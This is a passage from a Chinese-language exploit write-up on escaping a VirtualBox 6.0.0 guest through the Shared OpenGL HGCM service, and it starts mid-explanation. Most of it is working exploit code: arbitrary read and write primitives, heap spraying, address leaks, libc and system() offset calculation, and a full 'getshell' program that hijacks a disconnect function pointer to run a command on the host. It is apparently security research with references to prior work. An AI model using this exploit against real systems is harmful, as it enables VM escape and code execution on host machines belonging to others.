            return VERR_BUFFER_OVERFLOW;
        }
        *pcbBuffer = pClient->conn->cbHostBuffer;
        if (*pcbBuffer)
        {
            CRASSERT(pClient->conn->pHostBuffer);
            crMemcpy(pBuffer, pClient->conn->pHostBuffer, *pcbBuffer);
            pClient->conn->cbHostBuffer = 0;
        }
        return VINF_SUCCESS;
    }
关键的一句代码`crMemcpy(pBuffer, pClient->conn->pHostBuffer,
*pcbBuffer);`，可见该命令的作用是将`pClient->conn->pHostBuffer`中的内容拷贝给Guest，由于现在我们实现了任意地址写，并且`pClient->conn`的地址也已经知道，那么我们可以控制`pHostBuffer`，从而实现任意地址读。
    int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) {
       //设置pHostBuffer为目的地址
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&addr);
       //设置size
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&size);
       //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容
       return read_hostbuf(client,0x100,buf);
    }
现在利用任意地址读，泄露出`CRConnection`中的函数指针
       //读取函数指针，泄露地址
       arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);
       uint64_t alloc_addr = *((uint64_t *)buff);
       printf("alloc_addr=0x%lx\n",alloc_addr);
当我们调试时，发现当我们的程序运行完毕以后，虚拟机就是崩溃
    pwndbg> k
    #0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
    #1  0x00007f0b1da41921 in __GI_abort () at abort.c:79
    #2  0x00007f0b1da8a967 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7f0b1dbb7b0d "%s\n") at ../sysdeps/posix/libc_fatal.c:181
    #3  0x00007f0b1da919da in malloc_printerr (str=str@entry=0x7f0b1dbb9818 "double free or corruption (out)") at malloc.c:5342
    #4  0x00007f0b1da98f6a in _int_free (have_lock=0, p=0x7f0abb1470a0, av=0x7f0b1ddecc40 ) at malloc.c:4308
    #5  __GI___libc_free (mem=0x7f0abb1470b0) at malloc.c:3134
    #6  0x00007f0b2051da8f in RTMemFree (pv=) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/alloc.cpp:262
    #7  0x00007f0abaf25c4f in crFree (ptr=) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/mem.c:128
    #8  0x00007f0abaf385c9 in _crVBoxCommonDoDisconnectLocked (conn=0x7f0a04b05f50) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1370
    #9  crVBoxHGCMDoDisconnect (conn=0x7f0a04b05f50) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1412
    #10 0x00007f0abb171909 in crVBoxServerRemoveClientObj (pClient=0x7f0a05bd8d70) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:677
    #11 crVBoxServerRemoveClient (u32ClientID=43) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:716
    #12 0x00007f0abb160945 in svcDisconnect (u32ClientID=, pvClient=) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:144
    #13 0x00007f0afdaa1eb4 in hgcmServiceThread (pThread=0x7f0ab0003a60, pvUser=0x7f0ab0003900) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:684
    #14 0x00007f0afda9fd5f in hgcmWorkerThreadFunc (hThreadSelf=, pvUser=0x7f0ab0003a60) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200
    #15 0x00007f0b204b5e7c in rtThreadMain (pThread=pThread@entry=0x7f0ab0003c90, NativeThread=NativeThread@entry=139684077311744, pszThreadName=pszThreadName@entry=0x7f0ab0004570 "ShCrOpenGL") at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719
通过栈回溯发现，是因为`pHostBuffer`在`disconnect`时，被`free`了，由于`pHostBuffer`被我们指向了任意地址，因此不会是一个合法的`chunk`。但是想到我们并没有对`HGCM`进行`disconnect`操作，经过研究发现只要我们的程序结束运行，`HGCM`就会自动断开。因此解决方法有很多，一种是不让我们的程序结束，结尾放一个死循环；另一种是将`disconnect`函数指针指向附近的`retn`指令，使得执行该指令时什么都不做。这里我使用的是第二种方法，因此我们的任意地址读原语
    int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) {
       char val = 0x64;
       //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处
       arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&val);
       //设置pHostBuffer为目的地址
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&addr);
       //设置size
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&size);
       //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容
       stop();
       return read_hostbuf(client,0x100,buf);
    }
###  getshell
    #include 
    #include 
    #include 
    #include 
    #include "chromium.h"
    #include "hgcm.h"
    #define OFFSET_ALLOC_FUNC_PTR 0xD0
    #define OFFSET_DISCONN_FUNC_PTR 0x128
    #define OFFSET_PCLIENT 0x248
    #define CRVBOXSVCBUFFER_SIZE 0x20
    #define OFFSET_CONN_HOSTBUF 0x238
    #define OFFSET_CONN_HOSTBUFSZ 0x244
    typedef struct LeakClient {
       int new_client;
       uint64_t client_addr;
       uint64_t conn_addr;
    } LeakClient;
    typedef struct ArbWrite {
       uint32_t size;
       uint64_t addr;
    } ArbWrite;
    LeakClient leak_client(int client) {
       //heap spray
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x298,"CRConnection_size_fill",23);
       }
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x9d0,"CRClient_size_fill",23);
       }
       //CRClient和CRConnection结构体将被创建
       int new_client = hgcm_connect("VBoxSharedCrOpenGL");
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x298,"CRConnection_size_fill",23);
       }
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x9d0,"CRClient_size_fill",23);
       }
       //释放CRClient和CRConnection结构体
       hgcm_disconnect(new_client);
       uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                    0x66666666, //conn_id
                    1, //numOpcodes
                    CR_EXTEND_OPCODE << 24,
                    OFFSET_PCLIENT, //packet_length
                    CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode
                    0, //program
                    *(uint32_t *)"leak" //name
                    };
       //将crmsg的unpack_buffer申请占位到之前的CRConnection结构体位置，从而进行数据泄露
       crmsg(client,0x298,msg,sizeof(msg));
       uint64_t client_addr = *(uint64_t *)(crmsg_buf+0x10);
       uint64_t conn_addr = client_addr +  0x9e0;
       //重新将新的CRClient和CRConnection结构体占位与此
       new_client = hgcm_connect("VBoxSharedCrOpenGL");
       LeakClient lc = {
            .new_client = new_client,
            .client_addr = client_addr,
            .conn_addr = conn_addr
       };
       return lc;
    }
    int stop() {
       char buf[0x10];
       write(1,"stop",0x5);
       read(0,buf,0x10);
    }
    int oob_buf;
    int arb_buf;
    int make_oob_buf(int client) {
       uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                    0x66666666, //conn_id
                    1, //numOpcodes
                    CR_EXTEND_OPCODE << 24,
                    0x12345678,
                    CR_SHADERSOURCE_EXTEND_OPCODE, //extend opcode
                    0, //shader
                    2, //count
                    0, //hasNonLocalLen
                    0x1,0x1B, // *pLocalLength
                    0x12345678 //padding
                    };
       //heap spray
       int buf1,buf2,buf3,buf4;
       for (int i=0;i<0x5000;i++) {
           buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));
           buf2 = alloc_buf(client,sizeof(msg),"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",sizeof(msg));
           buf3 = alloc_buf(client,sizeof(msg),"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",sizeof(msg));
           buf4 = alloc_buf(client,sizeof(msg),"cccccccccccccccccccccccccccccccccccccc",sizeof(msg));
       }
       crmsg_with_bufid(client,buf1);
       //generate a new id
       char *buf2_id = (char *)&buf2;
       for (int i=0;i<4;i++) {
          if (buf2_id[i] == '\0') buf2_id[i] = '\n';
       }
       //now buf2 was corrupted
       oob_buf = buf2;
       arb_buf = buf3;
       return 0;
    }
    int arb_write(int client,uint64_t addr,uint32_t size,void *buf) {
       ArbWrite data = {
          .size = size,
          .addr = addr
       };
       //set CRVBOXSVCBUFFER_t's pData and size
       write_buf(client,oob_buf,0xa30,0x44,&data,sizeof(data));
       //arb write
       write_buf(client,arb_buf,size,0,buf,size);
       return 0;
    }
    int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) {
       char val = 0x64;
       //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处
       arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&val);
       //设置pHostBuffer为目的地址
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&addr);
       //设置size
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&size);
       //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容
       stop();
       return read_hostbuf(client,0x100,buf);
    }
    unsigned char buff[0x100] = {0};
    int main() {
       int idClient = hgcm_connect("VBoxSharedCrOpenGL");
       printf("idClient=%d\n",idClient);
       set_version(idClient);
       //泄露出CRConnection的地址
       LeakClient leak = leak_client(idClient);
       int new_client = leak.new_client;
       set_version(new_client);
       uint64_t conn_addr = leak.conn_addr;
       printf("new_client=%d new_client's CRClient addr=0x%lx CRConnection addr=0x%lx\n",new_client,leak.client_addr,conn_addr);
       //制造OOB对象
       make_oob_buf(new_client);
       hgcm_disconnect(idClient);
       //读取函数指针，泄露地址
       arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);
       uint64_t alloc_addr = *((uint64_t *)buff);
       printf("alloc_addr=0x%lx\n",alloc_addr);
       uint64_t VBoxOGLhostcrutil_base = alloc_addr - 0x209d0;
       uint64_t abort_got = VBoxOGLhostcrutil_base + 0x22F0B0;
       arb_read(new_client,conn_addr,abort_got,8,buff);
       uint64_t abort_addr = *((uint64_t *)buff);
       printf("abort_addr=0x%lx\n",abort_addr);
       uint64_t libc_base = abort_addr - 0x407e0;
       uint64_t system_addr = libc_base + 0x4f550;
       printf("libc_base=0x%lx\n",libc_base);
       printf("system_addr=0x%lx\n",system_addr);
       //修改disconnect函数指针为system地址
       arb_write(new_client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x8,&system_addr);
       char *cmd = "/usr/bin/galculator";
       arb_write(new_client,conn_addr,strlen(cmd)+1,cmd);
       //getshell
       hgcm_disconnect(new_client);
    }
效果如下
有关我前面分析到的`HGCM`协议和`Chromium`协议使用的C语言版的3dpwn库在我的[github](https://github.com/ha1vk/3dpwn_c)，欢迎大家来个star。
## 0x03 感想
第一次完成了VirtualBox的虚拟机逃逸，收获很多，成就感也很大。在安全研究的这条路上还要走很远，加油。
## 0x04 参考
[Breaking Out of VirtualBox through 3D
Acceleration](https://www.coresecurity.com/sites/default/files/private-files/publications/2016/05/corelabs-Breaking_Out_of_VirtualBox_through_3D_Acceleration-Francisco_Falcon.pdf)  
[48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅](https://zhuanlan.zhihu.com/p/58910752)  
[Virtual-Box-Exploitation-2](https://matshao.com/2019/05/20/Virtual-Box-Exploitation-2/)  
[Better slow than sorry – VirtualBox 3D acceleration considered
harmful](https://phoenhex.re/2018-07-27/better-slow-than-sorry)  
[利用Chromium漏洞夺取CTF胜利：VitualBox虚拟机逃逸漏洞分析（CVE-2019-2446）](https://blog.csdn.net/systemino/article/details/89716780)  
[3dpwn](https://github.com/niklasb/3dpwn)